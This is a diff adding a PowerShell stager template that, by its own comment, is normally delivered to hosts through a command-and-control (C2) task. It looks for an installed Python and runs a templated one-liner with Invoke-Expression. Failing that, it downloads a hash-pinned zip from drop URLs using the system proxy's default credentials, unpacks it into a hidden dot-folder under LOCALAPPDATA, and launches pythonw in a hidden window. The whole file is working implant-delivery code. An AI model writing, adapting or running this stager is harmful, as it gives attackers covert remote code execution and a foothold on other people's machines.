@@ -1,0 +1,158 @@
+$ErrorActionPreference = 'Stop'
+$PSNativeCommandUseErrorActionPreference = $false
+
+$sBase = '@@BASE_DIR@@'
+$sDrops = @@DROPS@@
+$sParent = $env:LOCALAPPDATA
+if (-not $sParent) { $sParent = $env:APPDATA }
+if (-not $sParent) { $sParent = $env:TEMP }
+
+function sProbe {
+    foreach ($sName in @('python.exe', 'python3.exe', 'pythonw.exe', 'py.exe')) {
+        $sCmd = Get-Command $sName -ErrorAction SilentlyContinue
+        if (-not $sCmd) { continue }
+        $sPath = $sCmd.Source
+        if (-not $sPath) { continue }
+        $sCode = 1
+        $sEap = $ErrorActionPreference
+        try {
+            # Two halves of one guard, because there are three ways a
+            # native command's stderr becomes NativeCommandError records
+            # that 'Stop' throws on -- and the catch below would read any
+            # such throw as a failed version check, judging an interpreter
+            # at or above the floor unusable and fetching a bundle onto a
+            # host that already had a Python.
+            #   1. This script redirecting stderr. In Windows PowerShell
+            #      5.1 any `2>` or `*>` on a native command promotes its
+            #      stderr -- `2>&1` and `2>$null` alike. Handled by not
+            #      redirecting it: only stdout goes to $null. Adding any
+            #      `2>` or `*>` here, however tidy it looks, puts the
+            #      defect straight back.
+            #   2. The *caller* redirecting this script's stderr, as in
+            #      `powershell -File ... 2> log`.
+            #   3. No console to inherit: ISE, WinRM, Invoke-Command,
+            #      Start-Process -RedirectStandardError, or a C2 task that
+            #      pipes both streams -- which is how this script normally
+            #      arrives on a host.
+            # Nothing here can stop 2 and 3 capturing stderr, so the
+            # verdict on the record is changed instead: 'Continue' for the
+            # two statements below, restored in the finally, which cannot
+            # be skipped. The window writes nothing and runs before any
+            # directory exists.
+            $ErrorActionPreference = 'Continue'
+            & $sPath -c 'import sys;sys.exit(0 if sys.version_info[:2] >= (@@MIN_MAJOR@@, @@MIN_MINOR@@) else 1)' 1>$null
+            $sCode = $LASTEXITCODE
+        } catch {
+            $sCode = 1
+        } finally { $ErrorActionPreference = $sEap }
+        if ($sCode -eq 0) { return $sPath }
+    }
+    return $null
+}
+
+$sFound = sProbe
+if ($sFound) {
+    function python { & $sFound @args }
+    function python3 { & $sFound @args }
+    $global:LASTEXITCODE = 0
+    try { Invoke-Expression '@@ONELINER@@' } catch { exit 1 }
+    if ($null -eq $LASTEXITCODE) { exit 0 }
+    exit $LASTEXITCODE
+}
+
+if ($sDrops.Count -eq 0) { exit 2 }
+
+if (-not $sParent) {
+    [Console]::Error.WriteLine('no per-user directory here: refusing')
+    exit 4
+}
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor 3072
+
+function sFetch($sUrl, $sOut) {
+    $sReq = [Net.HttpWebRequest][Net.WebRequest]::Create($sUrl)
+    $sReq.Timeout = 600000
+    $sReq.ReadWriteTimeout = 600000
+    try {
+        $sProxy = [Net.WebRequest]::GetSystemWebProxy()
+        if ($sProxy) {
+            $sProxy.Credentials = [Net.CredentialCache]::DefaultCredentials
+            $sReq.Proxy = $sProxy
+        }
+    } catch { }
+    $sRes = $sReq.GetResponse()
+    try {
+        $sIn = $sRes.GetResponseStream()
+        $sOutStream = [IO.File]::Create($sOut)
+        try { $sIn.CopyTo($sOutStream) }
+        finally { $sOutStream.Close(); $sIn.Close() }
+    } finally { $sRes.Close() }
+}
+
+function sSum($sFile) {
+    $sAlg = [Security.Cryptography.SHA256]::Create()
+    $sStream = [IO.File]::OpenRead($sFile)
+    try { $sBytes = $sAlg.ComputeHash($sStream) } finally { $sStream.Close() }
+    return (-join ($sBytes | ForEach-Object { $_.ToString('x2') }))
+}
+
+$sTmp = Join-Path ([IO.Path]::GetTempPath()) ([IO.Path]::GetRandomFileName())
+New-Item -ItemType Directory -Path $sTmp -Force | Out-Null
+try {
+    $sFile = Join-Path $sTmp 'b'
+    $sOk = $false
+    foreach ($sDrop in $sDrops) {
+        if (Test-Path $sFile) { Remove-Item -Force $sFile }
+        try { sFetch $sDrop.u $sFile }
+        catch { continue }
+        if (-not (Test-Path $sFile)) { continue }
+        $sGot = ''
+        try { $sGot = sSum $sFile } catch { $sGot = '' }
+        if ($sGot.Length -ne 64) {
+            [Console]::Error.WriteLine('this file could not be hashed: refused')
+            Remove-Item -Force $sFile
+            continue
+        }
+        if ($sGot -ne $sDrop.h) {
+            [Console]::Error.WriteLine('digest does not match the pin: refused')
+            Remove-Item -Force $sFile
+            continue
+        }
+        $sOk = $true
+        break
+    }
+    if (-not $sOk) {
+        [Console]::Error.WriteLine('no location answered with what was pinned')
+        exit 3
+    }
+
+    if (-not (Test-Path $sParent)) {
+        New-Item -ItemType Directory -Path $sParent -Force | Out-Null
+    }
+    $sStage = Join-Path $sParent ('.' + $sBase + '.' + [IO.Path]::GetRandomFileName())
+    New-Item -ItemType Directory -Path $sStage -Force | Out-Null
+    try {
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+        [IO.Compression.ZipFile]::ExtractToDirectory($sFile, $sStage)
+        $sRoot = Join-Path $sStage $sBase
+        if (-not (Test-Path $sRoot)) { exit 5 }
+        $sExe = $null
+        foreach ($sName in @('pythonw.exe', 'python.exe')) {
+            if (Test-Path (Join-Path $sRoot $sName)) { $sExe = $sName; break }
+        }
+        if (-not $sExe) { exit 5 }
+        $sDest = Join-Path $sParent $sBase
+        if (Test-Path $sDest) { Remove-Item -Recurse -Force $sDest }
+        Move-Item -Path $sRoot -Destination $sDest
+        Start-Process -FilePath (Join-Path $sDest $sExe) -WindowStyle Hidden
+        exit 0
+    } finally {
+        if (Test-Path $sStage) {
+            Remove-Item -Recurse -Force $sStage -ErrorAction SilentlyContinue
+        }
+    }
+} finally {
+    if (Test-Path $sTmp) {
+        Remove-Item -Recurse -Force $sTmp -ErrorAction SilentlyContinue
+    }
+}
